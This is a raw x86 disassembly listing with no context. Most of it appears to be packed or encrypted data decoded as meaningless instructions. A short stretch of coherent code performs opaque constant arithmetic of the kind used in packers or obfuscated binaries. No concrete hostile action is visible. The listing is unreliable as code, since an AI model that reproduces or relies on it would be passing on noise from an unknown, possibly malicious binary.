  4149c2:	cmp    BYTE PTR [ecx-0x8],0x7
  4149c6:	jl     0x4149fd
  4149c8:	hlt    
  4149c9:	loop   0x41499d
  4149cb:	push   ebx
  4149cc:	xor    edi,0xd59764d6
  4149d2:	mov    dh,0xe9
  4149d4:	inc    edi
  4149d5:	xlat   BYTE PTR ds:[ebx]
  4149d6:	gs test ch,dl
  4149d9:	mov    cs,WORD PTR ds:0x64da7cbc
  4149df:	add    eax,ebx
  4149e1:	mov    ah,0x5c
  4149e3:	aas    
  4149e4:	push   esp
  4149e5:	(bad)  
  4149e6:	ror    ch,1
  4149e8:	test   BYTE PTR [edi+0xd],ch
  4149eb:	mov    ebp,0x2dab74d3
  4149f0:	jmp    0x4149ac
  4149f2:	push   edx
  4149f3:	jge    0x41497d
  4149f5:	xor    DWORD PTR [edx+ecx*8],0x71
  4149f9:	mov    ah,0x57
  4149fb:	std    
  4149fc:	push   edx
  4149fd:	push   0xeb1e5ae6
  414a02:	sub    BYTE PTR [edi+0x2023eaaf],al
  414a08:	xchg   ecx,eax
  414a09:	jmp    0xf340f34a
  414a0e:	sub    al,0x26
  414a10:	pop    eax
  414a11:	js     0x4149a3
  414a13:	popf   
  414a14:	add    al,0x50
  414a16:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a18:	dec    esp
  414a19:	push   eax
  414a1a:	add    al,0xe3
  414a1c:	dec    edi
  414a1d:	or     al,0x5e
  414a1f:	push   ds
  414a20:	ss arpl cx,ax
  414a23:	push   eax
  414a24:	push   edx
  414a25:	arpl   WORD PTR [edx+0x5a604f1c],bx
  414a2b:	sbb    bl,al
  414a2d:	dec    edi
  414a2e:	pop    edx
  414a2f:	loop   0x4149b9
  414a31:	fdiv   QWORD PTR [eax-0x623acf46]
  414a37:	add    al,0xad
  414a39:	jg     0x414ab9
  414a3b:	dec    edx
  414a3c:	scas   eax,DWORD PTR es:[edi]
  414a3d:	outs   dx,BYTE PTR ds:[esi]
  414a3e:	cmp    DWORD PTR gs:[ecx],ecx
  414a41:	test   eax,0xee0a672a
  414a46:	xor    esi,DWORD PTR [edx]
  414a48:	mov    eax,0x265f2ec5
  414a4d:	dec    edi
  414a4e:	jl     0x4149e8
  414a50:	push   DWORD PTR [eax+0x5605f1df]
  414a56:	jle    0x414ac1
  414a58:	xchg   ch,al
  414a5a:	ins    BYTE PTR es:[edi],dx
  414a5b:	cmp    esi,DWORD PTR [ecx+0x7f]
  414a5e:	adc    DWORD PTR [edx+edx*4+0x10dfcf6e],esi
  414a65:	sti    
  414a66:	outs   dx,BYTE PTR ds:[esi]
  414a67:	test   BYTE PTR [eax-0x415a0b4c],0xc2
  414a6e:	shr    DWORD PTR [esi],1
  414a70:	inc    ecx
  414a71:	inc    edi
  414a72:	or     al,0x8a
  414a74:	mov    ds:0x777e10b,eax
  414a79:	sbb    eax,0x953283aa
  414a7e:	lock out 0x23,al
  414a81:	neg    DWORD PTR ds:0xf22f606d
  414a87:	or     BYTE PTR [ebp+esi*1-0x1e],0xb2
  414a8c:	ret    
  414a8d:	mov    bh,0x8d
  414a8f:	mov    eax,ds:0x1549adfb
  414a94:	cmp    ecx,DWORD PTR [ecx]
  414a96:	mov    ebp,0xad5ca4
  414a9b:	(bad)  
  414a9c:	mov    bl,0x56
  414a9e:	inc    esi
  414a9f:	xor    ch,0xcd
  414aa2:	sub    BYTE PTR [ebx],dh
  414aa4:	cli    
  414aa5:	(bad)  
  414aa6:	xchg   esi,eax
  414aa7:	cmp    edx,esp
  414aa9:	add    dl,BYTE PTR [esi-0x71]
  414aac:	push   esp
  414aad:	mov    dl,0x69
  414aaf:	jo     0x414af7
  414ab1:	jo     0x414aca
  414ab3:	adc    eax,0x3f6ab030
  414ab8:	or     eax,0x4014e160
  414abd:	mov    cl,0x51
  414abf:	into   
  414ac0:	or     al,0xd
  414ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ac3:	mov    bl,0xeb
  414ac6:	hlt    
  414ac7:	cmp    al,BYTE PTR [eax-0x5686e4d4]
  414acd:	mov    WORD PTR [ebp-0x7dc53222],fs
  414ad3:	popa   
  414ad4:	adc    eax,0x95c127ec
  414ad9:	out    0xe2,eax
  414adb:	jle    0x414b42
  414add:	test   al,0x58
  414adf:	pop    ebp
  414ae0:	push   esp
  414ae1:	and    edx,DWORD PTR [edx+0x1a]
  414ae4:	xlat   BYTE PTR ds:[ebx]
  414ae5:	aas    
  414ae6:	xchg   esp,eax
  414ae7:	jl     0x414a8e
  414ae9:	xchg   esi,eax
  414aea:	pop    edx
  414aeb:	aaa    
  414aec:	cmc    
  414aed:	mov    WORD PTR [ecx-0x2d6d09ee],fs
  414af3:	mov    ch,BYTE PTR [edi]
  414af5:	inc    ebx
  414af6:	mov    esi,0xe9b4d4a6
  414afb:	test   eax,0x85cf6bad
  414b00:	shr    BYTE PTR [eax+0x5458103a],0xa6
  414b07:	not    DWORD PTR [esi-0x1baa19de]
  414b0d:	aas    
  414b0e:	(bad)  
  414b0f:	popf   
  414b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b11:	int    0x42
  414b13:	sub    ecx,DWORD PTR [ebp+edi*8-0x4a]
  414b17:	dec    edx
  414b18:	sub    eax,0x49d56564
  414b1d:	int3   
  414b1e:	or     eax,0xdd6454bb
  414b23:	les    esp,FWORD PTR [eax-0x4f9f8caa]
  414b29:	repz mov dh,0x4c
  414b2c:	out    dx,al
  414b2d:	pop    ss
  414b2e:	fmul   st(6),st
  414b30:	shl    esi,0x93
  414b33:	adc    dl,BYTE PTR [ebp+0x1993573d]
  414b39:	(bad)  
  414b3a:	fsub   QWORD PTR [ecx]
  414b3c:	xor    BYTE PTR [edx-0x39],ch
  414b3f:	mov    DWORD PTR [eax-0x5f],edi
  414b42:	pop    ss
  414b43:	mov    ebx,0x5849ada8
  414b48:	adc    eax,0x6ed95878
  414b4d:	hlt    
  414b4e:	sub    edx,ebx
  414b50:	into   
  414b51:	gs mov ah,0x2a
  414b54:	popw   es
  414b56:	jge    0x414bd3
  414b58:	sub    eax,ebx
  414b5a:	push   ds
  414b5b:	sub    DWORD PTR [eax-0x17],eax
  414b5e:	push   edi
  414b5f:	fisttp QWORD PTR [edi]
  414b61:	jecxz  0x414b2c
  414b63:	jp     0x414be4
  414b65:	ins    BYTE PTR es:[edi],dx
  414b66:	scas   al,BYTE PTR es:[edi]
  414b67:	jnp    0x414b30
  414b69:	addr16 mov esi,0x45e762ef
  414b6f:	scas   eax,DWORD PTR es:[edi]
  414b70:	das    
  414b71:	adc    BYTE PTR [ecx+0x26],dl
  414b74:	lahf   
  414b75:	add    eax,0x6e1f6795
  414b7a:	iret   
  414b7b:	outs   dx,BYTE PTR ds:[esi]
  414b7c:	loope  0x414bae
  414b7e:	setnp  BYTE PTR [ebx+0x2e]
  414b82:	or     edx,DWORD PTR [ebp+ebx*8-0x716e18a2]
  414b89:	fdivr  DWORD PTR [ebx-0x6ac3329e]
  414b8f:	and    bl,BYTE PTR ds:0xc0705970
  414b95:	out    dx,al
  414b96:	adc    BYTE PTR [edi],cl
  414b98:	ret    0x276d
  414b9b:	inc    esp
  414b9c:	repz aaa 
  414b9e:	outs   dx,BYTE PTR ds:[esi]
  414b9f:	gs fninit 
  414ba2:	(bad)  
  414ba3:	sub    al,0x97
  414ba5:	mov    ds:0x3bd6a450,al
  414baa:	imul   edi,ecx,0x4e
  414bad:	inc    edx
  414bae:	add    BYTE PTR [ecx],bh
  414bb0:	push   eax
  414bb1:	fistp  DWORD PTR [esi+0x3c]
  414bb4:	push   ebp
  414bb5:	loopne 0x414bb8
  414bb7:	enter  0x10b1,0xad
  414bbb:	cs cwde 
  414bbd:	jnp    0x414c35
  414bbf:	clc    
  414bc0:	push   ecx
  414bc1:	mov    ah,0xa3
  414bc3:	test   DWORD PTR [eax+0x69],0xd5528552
  414bca:	dec    edx
  414bcb:	pusha  
  414bcc:	mov    al,ds:0x6bb1b93c
  414bd1:	ss xchg edi,eax
  414bd3:	ror    DWORD PTR [edx],1
  414bd5:	rcr    bh,cl
  414bd7:	aas    
  414bd8:	dec    edx
  414bd9:	dec    edx
  414bda:	mov    dh,BYTE PTR [ecx+0x6825a6fb]
  414be0:	daa    
  414be1:	cmp    al,BYTE PTR [ebx+0x3a42f508]
  414be7:	data16 repnz add bl,BYTE PTR [edx+ebx*4+0x1429b870]
  414bf0:	jmp    0x77e5496f
  414bf5:	dec    esi
  414bf6:	popa   
  414bf7:	jo     0x414bcc
  414bf9:	shr    BYTE PTR [edx],0xc3
  414bfc:	cdq    
  414bfd:	repnz jecxz 0x414c37
  414c00:	mov    DWORD PTR [ecx-0x3c],ebp
  414c03:	imul   ebp,DWORD PTR gs:[ebp-0x40],0x2d28cfe
  414c0b:	(bad)  
  414c0c:	ror    BYTE PTR [edx-0x44],cl
  414c0f:	test   BYTE PTR [ecx+0x20394c13],bh
  414c15:	inc    ecx
  414c16:	xor    eax,0x808f301d
  414c1b:	repz xor eax,eax
  414c1e:	pop    ebx
  414c1f:	add    al,dl
  414c21:	das    
  414c22:	or     DWORD PTR [edx],esp
  414c24:	sub    BYTE PTR [ebx+0x551cd2ef],dl
  414c2a:	sbb    eax,0x475c9a06
  414c2f:	popf   
  414c30:	adc    eax,DWORD PTR [edx-0x7a347fcd]
  414c36:	add    DWORD PTR [ebx-0x3a2bb091],edi
  414c3c:	out    0x1a,eax
  414c3e:	idiv   DWORD PTR [edx-0x5f79af6]
  414c44:	push   ebx
  414c45:	adc    al,0xfd
  414c47:	sbb    DWORD PTR [ebx],ebp
  414c49:	(bad)  
  414c4a:	adc    DWORD PTR [edx+0x5374a920],esi
  414c50:	ins    DWORD PTR es:[edi],dx
  414c51:	adc    ebp,DWORD PTR [esi]
  414c53:	out    0x16,al
  414c55:	dec    esi
  414c56:	sti    
  414c57:	mov    bh,dh
  414c59:	push   ss
  414c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c5b:	adc    DWORD PTR [ecx+0x78],esi
  414c5e:	sahf   
  414c5f:	dec    edx
  414c60:	add    BYTE PTR [edx-0x3047844c],dh
  414c66:	push   ds
  414c67:	push   esi
  414c68:	icebp  
  414c69:	pop    edx
  414c6a:	(bad)  [ebx+0x3f33011d]
  414c70:	fld    QWORD PTR [esi+0x39]
  414c73:	(bad)  
  414c74:	adc    eax,0xebc00fda
  414c79:	jp     0x414cc9
  414c7b:	js     0x414caa
  414c7d:	mov    ecx,0x2a1a4ad4
  414c82:	dec    ecx
  414c83:	jle    0x414caf
  414c85:	fldz   
  414c87:	mov    eax,ds:0xf168fcfc
  414c8c:	sbb    BYTE PTR [ebx],ah
  414c8e:	pop    esi
  414c8f:	dec    ecx
  414c90:	test   DWORD PTR [edi],0x801de80e
  414c96:	aaa    
  414c97:	push   ss
  414c98:	outs   dx,DWORD PTR ds:[esi]
  414c99:	(bad)  
  414c9a:	fistp  DWORD PTR [ebp-0x7a]
  414c9d:	jge    0x414cd5
  414c9f:	rol    dh,cl
  414ca1:	mov    ah,0xfb
  414ca3:	inc    esi
  414ca4:	stc    
  414ca5:	jmp    0xcc0ce18
  414caa:	std    
  414cab:	adc    ah,al
  414cad:	test   eax,0x1bcdcfb1
  414cb2:	fnsave [edi+0x704c73cb]
  414cb8:	nop
  414cb9:	mov    edi,0x35ed5d39
  414cbe:	cli    
  414cbf:	jnp    0x414cc4
  414cc1:	and    ecx,DWORD PTR [eax+edi*8+0x7f1dc02]
  414cc8:	jp     0x414c71
  414cca:	mov    esp,0xdc93802e
  414ccf:	jno    0x414cec
  414cd1:	adc    edi,DWORD PTR [eax-0x1aebf6c5]
  414cd7:	fild   QWORD PTR [esi]
  414cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cda:	daa    
  414cdb:	mov    dl,0x7a
  414cdd:	repz cmp DWORD PTR [esi-0x461ad093],ebx
  414ce4:	jae    0x414ce8
  414ce6:	push   ecx
  414ce7:	push   ebp
  414ce8:	push   ebp
  414ce9:	or     al,0x88
  414ceb:	xchg   esp,eax
  414cec:	mov    ecx,0x3ed6d62a
  414cf1:	fcom   QWORD PTR [edi]
  414cf3:	xor    ah,BYTE PTR [edx]
  414cf5:	cdq    
  414cf6:	and    BYTE PTR ds:0x64e34cd3,ch
  414cfc:	dec    esi
  414cfd:	mov    ch,0xdf
  414cff:	ins    BYTE PTR es:[edi],dx
  414d00:	fbstp  TBYTE PTR [esi-0x6c]
  414d03:	call   0x9283658d
  414d08:	aaa    
  414d09:	pop    ebx
  414d0a:	repnz fcmovne st,st(6)
  414d0d:	icebp  
  414d0e:	and    al,0x1a
  414d10:	push   ebx
  414d11:	push   esi
  414d12:	sbb    al,0x38
  414d14:	cmp    BYTE PTR [ebx+0x3fd330c4],bl
  414d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d1b:	push   edi
  414d1c:	jp     0x414cd5
  414d1e:	fadd   QWORD PTR [ecx+0x4e4cddbc]
  414d24:	adc    BYTE PTR [edx+0x96cc153],0x15
  414d2b:	adc    al,0xa4
  414d2d:	or     al,0x78
  414d2f:	adc    al,0xfe
  414d31:	in     al,0x13
  414d33:	addr16 retf 
  414d35:	sahf   
  414d36:	xchg   edx,eax
  414d37:	(bad)  
  414d38:	(bad)  
  414d39:	std    
  414d3a:	fwait
  414d3b:	inc    edi
  414d3c:	outs   dx,DWORD PTR ds:[esi]
  414d3d:	es xchg ebx,eax
  414d3f:	sub    eax,0x7bf082dd
  414d44:	sbb    ebp,DWORD PTR [esi+eiz*2-0x6c]
  414d48:	mov    BYTE PTR [ebx],al
  414d4a:	ror    DWORD PTR [ebx-0x37fcf7b3],0x89
  414d51:	dec    ebp
  414d52:	or     BYTE PTR [ebx+0x4d8bdc45],cl
  414d58:	fsub   DWORD PTR [ebx]
  414d5a:	ror    DWORD PTR [ebx-0x3edc2bb3],0x8b
  414d61:	dec    ebp
  414d62:	ror    BYTE PTR [edi],1
  414d64:	scas   eax,DWORD PTR es:[edi]
  414d65:	ror    DWORD PTR [ebx-0x3ef433b3],0x8b
  414d6c:	dec    ebp
  414d6d:	enter  0xaf0f,0xc1
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0xfb
  414e02:	add    DWORD PTR [ebx+0x161642b0],ebp
  414e08:	sbb    BYTE PTR [edx-0x6e7e7ee],dl
  414e0e:	shr    BYTE PTR [eax+0x31],0x4f
  414e12:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  414e14:	push   ss
  414e15:	or     edx,DWORD PTR [ebx]
  414e17:	or     ecx,edx
  414e19:	fs ds pop edx
  414e1c:	mov    ah,0x9f
  414e1e:	out    dx,eax
  414e1f:	aad    0x9
  414e21:	icebp  
  414e22:	sbb    BYTE PTR [ecx+eax*2],0x42
  414e26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e27:	cmc    
  414e28:	xchg   edi,eax
  414e29:	shl    DWORD PTR [edi-0x5a],0x7
  414e2d:	sets   BYTE PTR [ebx+0x22]
  414e31:	xchg   DWORD PTR [esi+0x7c],ebp
  414e34:	(bad)  
  414e35:	push   edi
  414e36:	push   ebx
  414e37:	jecxz  0x414e60
  414e39:	fistp  DWORD PTR [edx+0x66]
  414e3c:	xchg   ecx,eax
  414e3d:	cli    
  414e3e:	adc    ebp,edi
  414e40:	jg     0x414e12
  414e42:	jnp    0x414e20
  414e44:	test   edx,edx
  414e46:	stos   BYTE PTR es:[edi],al
  414e47:	xor    eax,0x70b6f622
  414e4c:	lods   al,BYTE PTR ds:[esi]
  414e4d:	jle    0x414e5f
  414e4f:	push   0x169712ed
  414e54:	in     eax,0x14
  414e56:	fs nop
  414e58:	cmc    
  414e59:	xor    ecx,DWORD PTR ds:0x8e7e2854
  414e5f:	inc    ebx
  414e60:	loope  0x414edb
  414e62:	rol    edi,1
  414e64:	shl    BYTE PTR [esi+0x3a44d03b],0x87
  414e6b:	mov    ah,0xde
  414e6d:	mov    ecx,fs
  414e6f:	mov    ecx,0x82077b73
  414e74:	inc    edx
  414e75:	inc    esi
  414e76:	lods   eax,DWORD PTR ds:[esi]
  414e77:	scas   eax,DWORD PTR es:[edi]
  414e78:	imul   eax,DWORD PTR [edx],0xffffff81
  414e7b:	dec    ecx
  414e7c:	inc    esp
  414e7d:	mov    ebp,0x5b483ae
  414e82:	push   edx
  414e83:	xor    dl,bh
  414e85:	sub    al,0xce
  414e87:	jg     0x414e7e
  414e89:	or     ch,dl
  414e8b:	fs mov al,0x99
  414e8e:	pop    ecx
  414e8f:	push   esi
  414e90:	push   esp
  414e91:	into   
  414e92:	dec    ebx
  414e93:	mov    al,0x7d
  414e96:	imul   edx,DWORD PTR [esp+edx*4-0x7e],0x35
  414e9b:	fidiv  DWORD PTR [ecx+0x2fc0f8]
  414ea1:	add    BYTE PTR [esi-0x10dacc1b],0xd9
  414ea8:	je     0x414ee1
  414eaa:	inc    esp
  414eab:	mov    ds:0x8e9be381,eax
  414eb0:	or     BYTE PTR [edx-0x6055781a],0xef
  414eb7:	cwde   
  414eb8:	test   BYTE PTR [ecx+0x3c466640],dl
  414ebe:	pop    es
  414ebf:	and    BYTE PTR [esi+0x44027101],bl
  414ec5:	sbb    dh,dl
  414ec7:	retf   0x4708
  414eca:	sbb    eax,0x5e389dce
  414ecf:	pop    esp
  414ed0:	cmc    
  414ed1:	pop    edx
  414ed2:	in     eax,dx
  414ed3:	jl     0x414efd
  414ed5:	mov    dh,0xd6
  414ed7:	and    bh,BYTE PTR [ebx]
  414ed9:	dec    edx
  414eda:	scas   al,BYTE PTR es:[edi]
  414edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414edc:	jb     0x414efe
  414ede:	xchg   edi,eax
  414edf:	sti    
  414ee0:	repnz dec ecx
  414ee2:	shl    BYTE PTR [ecx-0x43],0x6b
  414ee6:	fnstsw WORD PTR [ebx+0x65d73b35]
  414eec:	lods   eax,DWORD PTR ds:[esi]
  414eed:	inc    esp
  414eee:	cmp    esi,ebp
  414ef0:	call   0x8f495a13
  414ef5:	cld    
  414ef6:	cmp    BYTE PTR [ebx],dl
  414ef8:	cmp    DWORD PTR [ebx],0xffffffb6
  414efb:	push   ebp
  414efc:	xchg   ebp,eax
  414efd:	fild   DWORD PTR ds:0x8eb65b6e
  414f03:	sub    eax,0xb6cf47fa
  414f08:	mov    al,ds:0x5d9bafb0
  414f0d:	cmp    BYTE PTR [esp+ecx*1+0x3d5f5ed7],bh
  414f14:	or     BYTE PTR [ecx+edx*4],dl
  414f17:	inc    edi
  414f18:	jmp    0x414f53
  414f1a:	inc    edi
  414f1b:	xchg   edx,ebx
  414f1d:	fsub   st,st(2)
  414f1f:	mov    DWORD PTR [edx+0x6c],ebx
  414f22:	ins    DWORD PTR es:[edi],dx
  414f23:	and    DWORD PTR cs:[esi-0x1ba0452f],eax
  414f2a:	push   esp
  414f2b:	repz cdq 
  414f2d:	xlat   BYTE PTR ds:[ebx]
  414f2e:	mov    esp,0x97685a69
  414f33:	popa   
  414f34:	rcr    bl,1
  414f36:	repz xor al,0xc4
  414f39:	xor    edi,eax
  414f3b:	pop    ebp
  414f3c:	xchg   esi,eax
  414f3d:	mov    bh,0x28
  414f3f:	out    dx,al
  414f40:	lahf   
  414f41:	or     al,0xdd
  414f43:	popa   
  414f44:	pop    ebx
  414f45:	jecxz  0x414eeb
  414f47:	or     ch,al
  414f49:	jecxz  0x414ee2
  414f4b:	fs fwait
  414f4d:	push   ss
  414f4e:	pop    esp
  414f4f:	leave  
  414f50:	and    BYTE PTR [ecx-0x4cac90ed],bh
  414f56:	shr    BYTE PTR ds:0x39355f0a,cl
  414f5c:	mov    WORD PTR [eax-0x2d],gs
  414f5f:	cmp    DWORD PTR [eax+0x70],esi
  414f62:	mov    esp,0x6e14fb75
  414f67:	lock jb 0x414f9e
  414f6a:	cmp    bl,BYTE PTR [edi+0x55739958]
  414f70:	push   edi
  414f71:	cmp    al,0xed
  414f73:	sub    DWORD PTR [edx+0x42],ebp
  414f76:	lds    eax,FWORD PTR [esi+0x6a917d23]
  414f7c:	push   esp
  414f7d:	pop    ecx
  414f7e:	xor    WORD PTR [esi],bx
  414f81:	inc    edi
  414f82:	jecxz  0x414fef
  414f84:	loopne 0x414f35
  414f86:	pmullw mm1,QWORD PTR gs:[eax+0x7f]
  414f8b:	adc    BYTE PTR [edi],cl
  414f8d:	pop    ss
  414f8e:	cld    
  414f8f:	jmp    0xe3ca53cc
  414f94:	stos   DWORD PTR es:[edi],eax
  414f95:	test   al,0x6b
  414f97:	add    dh,BYTE PTR [ebx+edi*2+0x7]
  414f9b:	retf   0xc7ad
  414f9e:	mov    cl,0x7f
  414fa0:	xor    dl,dl
  414fa2:	and    dl,BYTE PTR [esi-0x74]
  414fa5:	pop    esp
  414fa6:	outs   dx,BYTE PTR ds:[esi]
  414fa7:	test   al,0x4e
  414fa9:	push   ds
  414faa:	sub    ecx,DWORD PTR [esi]
  414fac:	rcl    BYTE PTR [ebp+0x7],cl
  414faf:	pop    esp
  414fb0:	add    edx,ebx
  414fb2:	adc    al,BYTE PTR [ebx+ecx*4+0x7a]
  414fb6:	sbb    bl,BYTE PTR [esp+esi*2+0x5d704eee]
  414fbd:	leave  
  414fbe:	jnp    0x414feb
  414fc0:	push   es
  414fc1:	(bad)  
  414fc2:	fcomp  DWORD PTR ds:0xf03d895b
  414fc8:	sti    
  414fc9:	xchg   eax,esp
  414fcb:	inc    ebp
  414fcc:	retf   
  414fcd:	jns    0x414f8a
  414fcf:	repnz neg BYTE PTR [edi-0x7bdc772a]
  414fd6:	xchg   BYTE PTR [ecx+0x490d19a7],ah
  414fdc:	pop    eax
  414fdd:	test   eax,0xae1f051b
  414fe2:	mov    ds:0xe920a0f9,al
  414fe7:	jmp    0x2612342
  414fec:	sbb    bh,BYTE PTR [eax-0x4d667533]
  414ff2:	and    eax,0x2a35eb41
  414ff7:	enter  0x8c3b,0xbd
  414ffb:	stos   BYTE PTR es:[edi],al
  414ffc:	(bad)  [eax]
  414ffe:	jge    0x415031
  415000:	fdivr  QWORD PTR [edx]
  415002:	je     0x415058
  415004:	dec    esi
  415005:	adc    DWORD PTR [esi-0x21],edx
  415008:	lock enter 0x725f,0xc2
  41500d:	fwait
  41500e:	or     DWORD PTR ds:0x8d0a7733,ebx
  415014:	inc    esp
  415015:	fwait
  415016:	lahf   
  415017:	sbb    al,0x14
  415019:	mov    ds:0x38f75d21,al
  41501e:	and    ecx,DWORD PTR [ecx]
  415020:	xchg   edx,eax
  415021:	mov    ebp,esi
  415023:	sbb    DWORD PTR [ecx+esi*2-0x4e],esp
  415027:	in     al,0x31
  415029:	lahf   
  41502a:	imul   esp,DWORD PTR [ebx+0x4bde0d4f],0x3a
  415031:	mov    esp,0x8977201b
  415036:	dec    esp
  415037:	enter  0xa1d9,0x6a
  41503b:	xchg   DWORD PTR [edi+eax*8],esi
  41503e:	xchg   DWORD PTR [eax],edx
  415040:	into   
  415041:	or     DWORD PTR [ebx-0x41],eax
  415044:	xor    eax,0x1c9be03f
  415049:	scas   eax,DWORD PTR es:[edi]
  41504a:	inc    edi
  41504b:	push   ss
  41504c:	jnp    0x41505a
  41504e:	sbb    dl,BYTE PTR [ebx+0x4c]
  415051:	in     al,0xb8
  415053:	add    ebp,edx
  415055:	inc    ebx
  415056:	out    dx,eax
  415057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415058:	fild   DWORD PTR [edx+0x63]
  41505b:	xor    ebx,ebp
  41505d:	or     DWORD PTR [esi],edx
  41505f:	mov    DWORD PTR [edi],ebp
  415061:	xchg   edi,eax
  415062:	int    0xea
  415064:	push   edx
  415065:	jb     0x415092
  415067:	push   edx
  415068:	mov    bl,0x53
  41506a:	in     eax,0x10
  41506c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41506d:	fldcw  WORD PTR [esi+0x2f]
  415070:	or     DWORD PTR [edi+0x2e],esp
  415073:	mov    di,0x2896
  415077:	xchg   BYTE PTR [edi+0x3d36ad55],ch
  41507d:	cmp    ch,dl
  41507f:	mov    bh,0xa3
  415081:	jae    0x415072
  415083:	loope  0x415022
  415085:	pop    eax
  415086:	pop    ds
  415087:	and    eax,edx
  415089:	je     0x415087
  41508b:	(bad)  
  41508c:	je     0x41507f
  41508e:	in     eax,0xd3
  415090:	dec    eax
  415091:	dec    ebp
  415092:	xchg   BYTE PTR [edx-0x799b2dec],bl
  415098:	ins    BYTE PTR es:[edi],dx
  415099:	and    esi,DWORD PTR [ecx]
  41509b:	js     0x41508b
  41509d:	inc    esi
  41509e:	mov    ah,0x5c
  4150a0:	clc    
  4150a1:	jge    0x41504e
  4150a3:	dec    ebx
  4150a4:	dec    ebx
  4150a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150a6:	push   es
  4150a7:	fisub  WORD PTR [eax+0x7]
  4150aa:	jp     0x41506e
  4150ac:	pushf  
  4150ad:	inc    edx
  4150ae:	(bad)  
  4150af:	fldenv [eax]
  4150b1:	and    BYTE PTR [eax],bh
  4150b3:	dec    esp
  4150b4:	shl    BYTE PTR [eax],cl
  4150b6:	loop   0x41506b
  4150b8:	mov    al,ds:0xb4e10fbf
  4150bd:	outs   dx,BYTE PTR ds:[esi]
  4150be:	mov    esp,0x47a88735
  4150c3:	dec    esp
  4150c4:	out    dx,eax
  4150c5:	sbb    ebx,edx
  4150c7:	retf   
  4150c8:	mov    ah,BYTE PTR [esi+0x2c]
  4150cb:	loop   0x4150af
  4150cd:	jbe    0x4150b9
  4150cf:	jmp    0xe80881df
  4150d4:	jne    0x41514d
  4150d6:	or     BYTE PTR [eax],dl
  4150d8:	aam    0xf6
  4150da:	mov    dh,0x69
  4150dc:	inc    ebx
  4150dd:	jg     0x415117
  4150df:	and    al,0xba
  4150e1:	xor    BYTE PTR [edx-0x9a2dac0],0x74
  4150e8:	xor    ebp,edi
  4150ea:	cmp    al,0xf6
  4150ec:	retf   
  4150ed:	add    esi,DWORD PTR [esi+0x1386309c]
  4150f3:	das    
  4150f4:	mov    edx,0xb6a7ce29
  4150f9:	xor    esp,esp
  4150fb:	jb     0x415174
  4150fd:	in     eax,dx
  4150fe:	cmp    BYTE PTR [eax],0x70
  415101:	xchg   esp,eax
  415102:	xor    DWORD PTR [ebx-0x2e512519],ebp
  415108:	stos   BYTE PTR es:[edi],al
  415109:	xor    eax,0x9be86c15
  41510e:	ret    
  41510f:	cld    
  415110:	sbb    eax,0x2dc4dd09
  415115:	jl     0x415153
  415117:	in     eax,0x3d
  415119:	test   BYTE PTR es:[edx+0x7e],ah
  41511d:	sub    eax,0x63b55590
  415122:	mov    dl,0xa2
  415124:	cmp    al,0xd7
  415126:	jns    0x415174
  415128:	in     al,0x2f
  41512a:	(bad)
  41512e:	sahf   
  41512f:	outs   dx,DWORD PTR ds:[esi]
  415130:	push   esi
  415131:	sub    DWORD PTR [edx+0x43],ebp
  415134:	adc    eax,0xb3bb818d
  415139:	dec    esp
  41513a:	into   
  41513b:	jae    0x415177
  41513d:	xor    esi,DWORD PTR [esi+0x3457e5f6]
  415143:	fwait
  415144:	shl    DWORD PTR [ebp+0x22],cl
  415147:	out    0xeb,eax
  415149:	push   0xffffffa9
  41514b:	push   ecx
  41514c:	adc    eax,0x437ede94
  415151:	push   edx
  415152:	aas    
  415153:	jle    0x41514e
  415155:	cld    
  415156:	test   esp,edi
  415158:	push   cs
  415159:	push   edx
  41515a:	jecxz  0x4150fd
  41515c:	lods   eax,DWORD PTR ds:[esi]
  41515d:	inc    ebx
  41515e:	adc    eax,DWORD PTR [ebx+0x36]
  415161:	cmc    
  415162:	xor    DWORD PTR ds:0x6504ca63,ecx
  415168:	push   es
  415169:	xor    ch,BYTE PTR [esi-0x1e9ef3f2]
  41516f:	test   DWORD PTR [ecx-0x7a],eax
  415172:	in     eax,dx
  415173:	add    DWORD PTR [ebx],esp
  415175:	(bad)
  415178:	and    eax,0x4540e5c6
  41517d:	jmp    0xb4ae5f33
  415182:	xchg   DWORD PTR [eax+0xd79b380],edx
  415188:	jns    0x415172
  41518a:	add    al,0xba
  41518c:	jecxz  0x415200
  41518e:	push   es
